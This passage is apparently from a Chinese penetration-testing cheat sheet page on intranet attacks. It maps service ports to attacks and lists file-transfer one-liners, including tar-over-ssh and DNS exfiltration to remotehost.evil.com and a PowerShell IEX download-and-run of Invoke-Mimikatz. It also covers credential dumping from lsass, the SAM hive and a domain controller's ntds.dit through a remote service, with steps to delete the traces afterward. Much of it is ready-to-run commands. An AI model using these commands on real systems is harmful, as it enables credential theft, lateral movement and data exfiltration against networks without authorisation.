+<td>smtp：邮件服务</td>
+<td>邮件伪造</td>
+</tr>
+<tr>
+<td>53</td>
+<td>DNS：域名系统</td>
+<td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td>
+</tr>
+<tr>
+<td>67/68</td>
+<td>dhcp</td>
+<td>劫持\欺骗</td>
+</tr>
+<tr>
+<td>110</td>
+<td>pop3</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>139</td>
+<td>samba</td>
+<td>爆破\未授权访问\远程代码执行</td>
+</tr>
+<tr>
+<td>143</td>
+<td>imap</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>161</td>
+<td>snmp</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>389</td>
+<td>ldap</td>
+<td>注入攻击\未授权访问</td>
+</tr>
+<tr>
+<td>512/513/514</td>
+<td>linux r</td>
+<td>直接使用rlogin</td>
+</tr>
+<tr>
+<td>873</td>
+<td>rsync</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>1080</td>
+<td>socket</td>
+<td>爆破：进行内网渗透</td>
+</tr>
+<tr>
+<td>1352</td>
+<td>lotus</td>
+<td>爆破：弱口令\信息泄漏：源代码</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>mssql</td>
+<td>爆破：使用系统用户登录\注入攻击</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>oracle</td>
+<td>爆破：TNS\注入攻击</td>
+</tr>
+<tr>
+<td>2049</td>
+<td>nfs</td>
+<td>配置不当</td>
+</tr>
+<tr>
+<td>2181</td>
+<td>zookeeper</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>mysql</td>
+<td>爆破\拒绝服务\注入</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>rdp</td>
+<td>爆破\Shift后门</td>
+</tr>
+<tr>
+<td>4848</td>
+<td>glassfish</td>
+<td>爆破：控制台弱口令\认证绕过</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>sybase/DB2</td>
+<td>爆破\注入</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>postgresql</td>
+<td>缓冲区溢出\注入攻击\爆破：弱口令</td>
+</tr>
+<tr>
+<td>5632</td>
+<td>pcanywhere</td>
+<td>拒绝服务\代码执行</td>
+</tr>
+<tr>
+<td>5900</td>
+<td>vnc</td>
+<td>爆破：弱口令\认证绕过</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>redis</td>
+<td>未授权访问\爆破：弱口令</td>
+</tr>
+<tr>
+<td>7001</td>
+<td>weblogic</td>
+<td>Java反序列化\控制台弱口令\控制台部署webshell</td>
+</tr>
+<tr>
+<td>80/443/8080</td>
+<td>web</td>
+<td>常见web攻击\控制台爆破\对应服务器版本漏洞</td>
+</tr>
+<tr>
+<td>8069</td>
+<td>zabbix</td>
+<td>远程命令执行</td>
+</tr>
+<tr>
+<td>9090</td>
+<td>websphere控制台</td>
+<td>爆破：控制台弱口令\Java反序列</td>
+</tr>
+<tr>
+<td>9200/9300</td>
+<td>elasticsearch</td>
+<td>远程代码执行</td>
+</tr>
+<tr>
+<td>11211</td>
+<td>memcacache</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>27017</td>
+<td>mongodb</td>
+<td>爆破\未授权访问</td>
+</tr>
+</tbody>
+</table>
+<p>引用：<a href="https://www.91ri.org/15441.html" target="_blank" rel="external">https://www.91ri.org/15441.html</a><br>
+wooyun也有讨论：<a href="http://zone.wooyun.org/content/18959" target="_blank" rel="external">http://zone.wooyun.org/content/18959</a><br>
+对于端口也就是一个服务的利用，上文也只是大概的讲述，一些常见的详细利用与防御可以看看：<br>
+<a href="http://wiki.wooyun.org/enterprise:server" target="_blank" rel="external">http://wiki.wooyun.org/enterprise:server</a></p>
+<h3 id="扫描分析">扫描分析</h3>
+<p>1、nbtscan<br>
+获取mac地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nbtstat -A 192.168.1.99</div></pre></td></tr></table></figure>
+<p>获取计算机名\分析dc\是否开放共享</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nbtscan 192.168.1.0/24</div></pre></td></tr></table></figure>
+<p><img src="./pic/4/1.jpg" alt=""><br>
+其中信息：<br>
+SHARING  表示开放来共享，<br>
+DC  表示可能是域控，或者是辅助域控<br>
+U=user  猜测此计算机登陆名<br>
+IIS  表示运行来web80<br>
+EXCHANGE  Microsoft Exchange服务<br>
+NOTES   Lotus Notes服务</p>
+<p>2、WinScanX<br>
+需要登录账号能够获取目标很详细的内容。其中还有snmp获取,windows密码猜解(但是容易被杀,nishang中也实现出一个类似的信息获取/Gather/Get-Information.ps1)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WinScanX.exe -3 DC1 centoso\pentest password -a &gt; test.txt</div></pre></td></tr></table></figure>
+<p><img src="./pic/4/2.jpg" alt=""></p>
+<p>3、端口扫描<br>
+InsightScan<br>
+proxy_socket后，直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains python scanner.py 192.168.0.0/24 -N</div></pre></td></tr></table></figure>
+<p><a href="http://insight-labs.org/?p=981" target="_blank" rel="external">http://insight-labs.org/?p=981</a></p>
+<h2 id="内网文件传输">内网文件传输</h2>
+<h3 id="windows下文件传输">windows下文件传输</h3>
+<p>1、powershell文件下载<br>
+powershell突破限制执行：powershell -ExecutionPolicy Bypass -File .\1.ps1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$d = New-Object System.Net.WebClient</div><div class="line">$d.DownloadFile(&quot;http://lemon.com/file.zip&quot;,&quot;c:/1.zip&quot;)</div></pre></td></tr></table></figure>
+<p>2、vbs脚本文件下载</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Set xPost=createObject(<span class="string">"Microsoft.XMLHTTP"</span>)</div><div class="line">xPost.Open <span class="string">"GET"</span>,<span class="string">"http://192.168.206.101/file.zip"</span>,<span class="number">0</span></div><div class="line">xPost.Send()</div><div class="line">set sGet=createObject(<span class="string">"ADODB.Stream"</span>)</div><div class="line">sGet.Mode=<span class="number">3</span></div><div class="line">sGet.Type=<span class="number">1</span></div><div class="line">sGet.Open()</div><div class="line">sGet.Write xPost.ResponseBody</div><div class="line">sGet.SaveToFile <span class="string">"c:\file.zip"</span>,<span class="number">2</span></div></pre></td></tr></table></figure>
+<p>下载执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript test.vbs</div></pre></td></tr></table></figure>
+<p>3、bitsadmin<br>
+win03测试没有,win08有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bitsadmin /transfer n http://lemon.com/file.zip c:\1.zip</div></pre></td></tr></table></figure>
+<p>4、文件共享<br>
+映射了一个，结果没有权限写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net use x: \\127.0.0.1\share /user:centoso.com\userID myPassword</div></pre></td></tr></table></figure>
+<p>5、使用telnet接收数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">服务端：nc -lvp 23 &lt; nc.exe</div><div class="line">下载端：telnet ip -f c:\nc.exe</div></pre></td></tr></table></figure>
+<p>6、hta<br>
+保存为.hta文件后运行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="keyword">var</span> <span class="built_in">Object</span> = <span class="keyword">new</span> ActiveXObject(<span class="string">"MSXML2.XMLHTTP"</span>);</div><div class="line"><span class="built_in">Object</span>.open(<span class="string">"GET"</span>,<span class="string">"http://192.168.206.101/demo.php.zip"</span>,<span class="literal">false</span>);</div><div class="line"><span class="built_in">Object</span>.send();</div><div class="line"><span class="keyword">if</span> (<span class="built_in">Object</span>.Status == <span class="number">200</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">var</span> Stream = <span class="keyword">new</span> ActiveXObject(<span class="string">"ADODB.Stream"</span>);</div><div class="line">    Stream.Open();</div><div class="line">    Stream.Type = <span class="number">1</span>;</div><div class="line">    Stream.Write(<span class="built_in">Object</span>.ResponseBody);</div><div class="line">    Stream.SaveToFile(<span class="string">"C:\\demo.zip"</span>, <span class="number">2</span>);</div><div class="line">    Stream.Close();</div><div class="line">&#125;</div><div class="line"><span class="built_in">window</span>.close();</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">"test"</span></span></div><div class="line"><span class="attr">WINDOWSTATE</span> = <span class="string">"minimize"</span>&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="linux下文件传输">linux下文件传输</h3>
+<p>1、perl脚本文件下载<br>
+kali下测试成功，centos5.5下，由于没有LWP::Simple这个，导致下载失败</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"><span class="keyword">use</span> LWP::Simple</div><div class="line">getstore(<span class="string">"http://lemon.com/file.zip"</span>, <span class="string">"/root/1.zip"</span>);</div></pre></td></tr></table></figure>
+<p>2、python文件下载</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">u = urllib2.urlopen(<span class="string">'http://lemon.com/file.zip'</span>)</div><div class="line">localFile = open(<span class="string">'/root/1.zip'</span>, <span class="string">'w'</span>)</div><div class="line">localFile.write(u.read())</div><div class="line">localFile.close()</div></pre></td></tr></table></figure>
+<p>3、ruby文件下载<br>
+centos5.5没有ruby环境</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"><span class="keyword">require</span> <span class="string">'net/http'</span></div><div class="line">Net::HTTP.start(<span class="string">"www.lemon.com"</span>) &#123; <span class="params">|http|</span></div><div class="line">r = http.get(<span class="string">"/file.zip"</span>)</div><div class="line">open(<span class="string">"/root/1.zip"</span>, <span class="string">"wb"</span>) &#123; <span class="params">|file|</span></div><div class="line">file.write(r.body)</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>4、wget文件下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget http://lemon.com/file.zip -P /root/1.zip</div><div class="line">其中-P是保存到指定目录</div></pre></td></tr></table></figure>
+<p>5、一边tar一边ssh上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar zcf - /some/localfolder | ssh remotehost.evil.com &quot;cd /some/path/name;tar zxpf -&quot;</div></pre></td></tr></table></figure>
+<p>6、利用dns传输数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar zcf - localfolder | xxd -p -c 16 |  while read line; do host $line.domain.com remotehost.evil.com; done</div></pre></td></tr></table></figure>
+<p>但是有时候会因为没找到而导致数据重复,对数据分析有点影响<br>
+<img src="./pic/4/6.jpg" alt=""></p>
+<h3 id="其他传输方式">其他传输方式</h3>
+<p>1、php脚本文件下载</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        $data = @file(<span class="string">"http://example.com/file"</span>);</div><div class="line">        $lf = <span class="string">"local_file"</span>;</div><div class="line">        $fh = fopen($lf, <span class="string">'w'</span>);</div><div class="line">        fwrite($fh, $data[<span class="number">0</span>]);</div><div class="line">        fclose($fh);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>2、ftp文件下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&gt;**windows下**</div><div class="line">&gt;ftp下载是需要交互，但是也可以这样去执行下载</div><div class="line">open host</div><div class="line">username</div><div class="line">password</div><div class="line">bin</div><div class="line">lcd c:/</div><div class="line">get file</div><div class="line">bye</div><div class="line">&gt;将这个内容保存为1.txt， ftp -s:&quot;c:\1.txt&quot;</div><div class="line">&gt;在mssql命令执行里面(不知道为什么单行执行一个echo,总是显示两行),个人一般喜欢这样</div><div class="line">echo open host &gt;&gt; c:\hh.txt &amp; echo username &gt;&gt; c:\hh.txt &amp; echo password &gt;&gt;c:\hh.txt &amp; echo bin &gt;&gt;c:\hh.txt &amp; echo lcd c:\&gt;&gt;c:\hh.txt &amp; echo get nc.exe  &gt;&gt;c:\hh.txt &amp; echo bye &gt;&gt;c:\hh.txt &amp; ftp -s:&quot;c:\hh.txt&quot; &amp; del c:\hh.txt</div><div class="line"></div><div class="line">&gt;**linux下**</div><div class="line"></div><div class="line">&gt;bash文件</div><div class="line">ftp 127.0.0.1</div><div class="line">username</div><div class="line">password</div><div class="line">get file</div><div class="line">exit</div><div class="line"></div><div class="line">&gt;或者使用busybox里面的tftp或者ftp</div><div class="line">&gt;busybox ftpget -u test -P test 127.0.0.1 file.zip</div></pre></td></tr></table></figure>
+<p>3、nc文件传输</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">服务端:cat file | nc -l 1234</div><div class="line">下载端:nc host_ip 1234 &gt; file</div></pre></td></tr></table></figure>
+<p>4、使用SMB传送文件<br>
+本地linux的smb环境配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&gt;vi /etc/samba/smb.conf</div><div class="line">[test]</div><div class="line">    comment = File Server Share</div><div class="line">    path = /tmp/</div><div class="line">    browseable = yes</div><div class="line">    writable = yes</div><div class="line">    guest ok = yes</div><div class="line">    read only = no</div><div class="line">    create mask = 0755</div><div class="line">&gt;service samba start</div></pre></td></tr></table></figure>
+<p>下载端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net use o: \\192.168.206.129\test</div><div class="line">dir o:</div></pre></td></tr></table></figure>
+<p><img src="./pic/4/5.jpg" alt=""></p>
+<h3 id="文件编译">文件编译</h3>
+<p>1、powershell将exe转为txt，再txt转为exe<br>
+nishang中的小脚本，测试一下将nc.exe转化为nc.txt再转化为nc1.exe<br>
+ExetoText.ps1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[byte[]] $hexdump = get-content -encoding byte -path &quot;nc.exe&quot;</div><div class="line">[System.IO.File]::WriteAllLines(&quot;nc.txt&quot;, ([string]$hexdump))</div></pre></td></tr></table></figure>
+<p>TexttoExe.ps1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[String]$hexdump = get-content -path &quot;nc.txt&quot;</div><div class="line">[Byte[]] $temp = $hexdump -split &apos; &apos;</div><div class="line">[System.IO.File]::WriteAllBytes(&quot;nc1.exe&quot;, $temp)</div></pre></td></tr></table></figure>
+<p><img src="./pic/4/3.jpg" alt=""></p>
+<p>2、csc.exe编译源码<br>
+csc.exe在C:\Windows\<a href="http://Microsoft.NET" target="_blank" rel="external">Microsoft.NET</a>\Framework\的各种版本之下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">csc.exe /out:C:\evil\evil.exe C:\evil\evil.cs</div></pre></td></tr></table></figure>
+<p><img src="./pic/4/4.jpg" alt=""></p>
+<p>3、debug程序<br>
+hex功能能将hex文件转换为exe文件(win08_x64没有这个,win03_x32有,听说是x32才有这个)</p>
+<p><img src="./pic/4/7.png" alt=""></p>
+<p>思路：</p>
+<ol>
+<li>把需要上传的exe转换成十六进制hex的形式</li>
+<li>通过echo命令将hex代码写入文件(echo也是有长度限制的)</li>
+<li>使用debug功能将hex代码还原出exe文件</li>
+</ol>
+<p><img src="./pic/4/8.jpg" alt=""><br>
+将ncc.txt的内容一条一条的在cmd下面执行，最后可以获取到123.hex、1.dll、nc.exe<br>
+exe2bat不支持大于64kb的文件</p>
+<hr>
+<h2 id="hash抓取">hash抓取</h2>
+<h3 id="hash简介">hash简介</h3>
+<p>windows hash:</p>
+<p>|        | 2000  | xp| 2003 | Vista | win7 | 2008 | 2012 |<br>
+|--------|<br>
+|   LM   | √ | √ | √ |<br>
+|  NTLM  | √ | √ | √ | √ | √ | √ | √|</p>
+<p>前面三个,当密码超过14位时候会采用NTLM加密<br>
+test:1003:E52CAC67419A9A22664345140A852F61:67A54E1C9058FCA16498061B96863248:::<br>
+前一部分是LM Hash，后一部分是NTLM Hash<br>
+当LM Hash是<strong>AAD3B435B51404EEAAD3B435B51404EE</strong><br>
+这表示<strong>空密码或者是未使用LM_HASH</strong></p>
+<p>Hash一般存储在两个地方：<br>
+SAM文件，存储在本机                         对应本地用户<br>
+NTDS.DIT文件，存储在域控上              对应域用户</p>
+<h3 id="本机hash明文抓取">本机hash+明文抓取</h3>
+<p>1、Get-PassHashes.ps1<br>
+<img src="./pic/5/3.jpg" alt=""></p>
+<p>2、导注册表+本地分析<br>
+Win2000和XP需要先提到SYSTEM，03开始直接可以reg save<br>
+导出的文件大,效率低,但是安全(测试的时候和QuarkPwDump抓取的hash不一致)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">reg save hklm\sam sam.hive</div><div class="line">reg save hklm\system system.hive</div><div class="line">reg save hklm\security security.hive</div></pre></td></tr></table></figure>
+<p><img src="./pic/5/4.jpg" alt=""></p>
+<p>3、QuarkPwDump</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QuarkPwDump.exe -dhl -o &quot;c:\1.txt&quot;</div></pre></td></tr></table></figure>
+<p><img src="./pic/5/5.jpg" alt=""></p>
+<p>4、getpass本地账户明文抓取<br>
+闪电小子根据mimikatz写的一个内存获取明文密码</p>
+<p><img src="./pic/5/6.jpg" alt=""></p>
+<p><a href="http://bbs.pediy.com/showthread.php?t=156643" target="_blank" rel="external">http://bbs.pediy.com/showthread.php?t=156643</a></p>
+<h3 id="win8win2012明文抓取">win8+win2012明文抓取</h3>
+<p>修改一个注册表就可以抓取了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1</div></pre></td></tr></table></figure>
+<p>测试失败<br>
+工具：<a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1" target="_blank" rel="external">https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1</a><br>
+文章地址：<a href="https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/" target="_blank" rel="external">https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/</a></p>
+<hr>
+<p>域用户hash抓取</p>
+<h3 id="mimikatz">mimikatz</h3>
+<p>只能抓取登陆过的用户hash，无法抓取所有用户,需要免杀<br>
+1、本机测试直接获取内存中的明文密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">privilege::debug</div><div class="line">sekurlsa::logonpasswords</div></pre></td></tr></table></figure>
+<p><img src="./pic/5/1.jpg" alt=""></p>
+<p>2、非交互式抓明文密码(webshell中)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; pssword.txt</div></pre></td></tr></table></figure>
+<p>3、powershell加载mimikatz抓取密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz</div></pre></td></tr></table></figure>
+<p>4、ProcDump + Mimikatz本地分析<br>
+文件会比较大，低效，但是安全(绕过杀软)<br>
+ps:mimikatz的平台（platform）要与进行dump的系统(source dump)兼容(比如dowm了08的,本地就要用08系统来分析)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">远程：</div><div class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</div><div class="line">本地：</div><div class="line">sekurlsa::minidump lsass.dump.dmp</div><div class="line">sekurlsa::logonpasswords full</div></pre></td></tr></table></figure>
+<p><img src="./pic/5/2.jpg" alt=""></p>
+<h3 id="ntdsdit的导出quarkpwdump读取分析">ntds.dit的导出+QuarkPwDump读取分析</h3>
+<p>无法抓取所有用户,需要免杀</p>
+<p>这个方法分为两步：<br>
+第一步是利用工具导出ntds.dit<br>
+第二步是利用QuarkPwDump去分析hash</p>
+<p>1、ntds.dit的导出</p>
+<ol>
+<li>ntdsutil    win2008开始DC中自带的工具</li>
+</ol>
+<blockquote>
+<p>a.交互式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;snapshot</div><div class="line">&gt;activate instance ntds</div><div class="line">&gt;create</div><div class="line">&gt;mount xxx</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="./pic/5/7.jpg" alt=""></p>
+<blockquote>
+<p>做完后unmount然后需要再delet一下</p>
+</blockquote>
+<p><img src="./pic/5/8.jpg" alt=""></p>
+<blockquote>
+<p>b.非交互</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</div><div class="line">&gt;ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</div><div class="line">&gt;copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</div><div class="line">&gt;ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="./pic/5/9.jpg" alt=""></p>
+<blockquote></blockquote>
+<ol start="2">
+<li>vshadow   微软的卷影拷贝工具</li>
+</ol>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;vshadow.exe -exec=%ComSpec% C:</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>其中%ComSpec%是cmd的绝对路径,它在建立卷影后会启动一个程序,只有这个程序才能卷影进行操作,其他不能,比如这里就是用cmd.exe来的<br>
+最后exit一下</p>
+</blockquote>
+<p><img src="./pic/5/10.jpg" alt=""></p>
+<p>2、QuarkPwDump分析<br>
+<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="external">https://github.com/quarkslab/quarkspwdump</a></p>
+<ol>
+<li>在线提取</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit</div></pre></td></tr></table></figure>
+<ol start="2">
+<li>离线提取<br>
+需要两个文件 ntds.dit 和 system.hiv<br>
+其中system.hiv可通过<code>reg save hklm\system system.hiv</code>获取</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hiv</div></pre></td></tr></table></figure>
+<p><img src="./pic/5/11.jpg" alt=""></p>
+<p>3、实战中hash导出流程</p>
+<blockquote>
+<p>1.建立ipc$连接<br>
+<code>net use \\DC1\c$ password /user:username</code><br>
+2.复制文件到DC<br>
+<code>copy .\* \\DC1\windows\tasks</code><br>
+3.sc建立远程服务启动程序<br>
+<code>sc \\DC1 create backupntds binPath= &quot;cmd /c start c:\windows\tasks\shadowcopy.bat&quot; type= share start= auto error= ignore DisplayName= BackupNTDS</code><br>
+4.启动服务<br>
+<code>sc \\DC1 start backupntds</code><br>
+5.删除服务<br>
+<code>sc \\DC1 delete backupntds</code><br>
+6.讲hash转移到本地<br>
+<code>move \\DC1\c$\windows\tasks\hash.txt .</code><br>
+7.删除记录文件<br>
+<code>del \\DC1\c$\windows\tasks\ntds.dit \\DC1\c$\windows\tasks\QuarksPwDump.exe \\DC1\c$\windows\tasks\shadowcopy.bat \\DC1\c$\windows\tasks\vshadow.exe</code></p>
+</blockquote>
+<p><img src="./pic/5/12.jpg" alt=""></p>
+<p>注意的两点是：<br>
+a.WORK_PATH和你拷贝的地方要相同<br>
+<img src="./pic/5/13.jpg" alt=""></p>
+<p>b.附件中的QuarkPwDump在win08上面运行报错,另外修改版可以,所以实战前还是要测试一下</p>
+<h3 id="vssownvbs-libesedb-ntdsxtract">vssown.vbs + libesedb + NtdsXtract</h3>
+<p>上面的QuarkPwDump是在win上面分析ntds.dit,这个是linux上面的离线分析<br>
+优点是能获取全部的用户,不用免杀,但是数据特别大,效率低,另外用vssown.vbs复制出来的ntds.dit数据库无法使用QuarksPwDump.exe读取</p>
+<p>hash导出：<br>
+<a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs" target="_blank" rel="external">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p>
+<p>最后需要copy出system和ntds.dit两个文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">c:\windows\system32\config\system</div><div class="line">c:\windows\ntds\ntds.dit</div></pre></td></tr></table></figure>
+<p><img src="./pic/5/14.jpg" alt=""><br>
+<img src="./pic/5/15.jpg" alt=""><br>
+记得一定要delete快照！！！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /delete *</div></pre></td></tr></table></figure>
+<p>本地环境搭建+分析：</p>
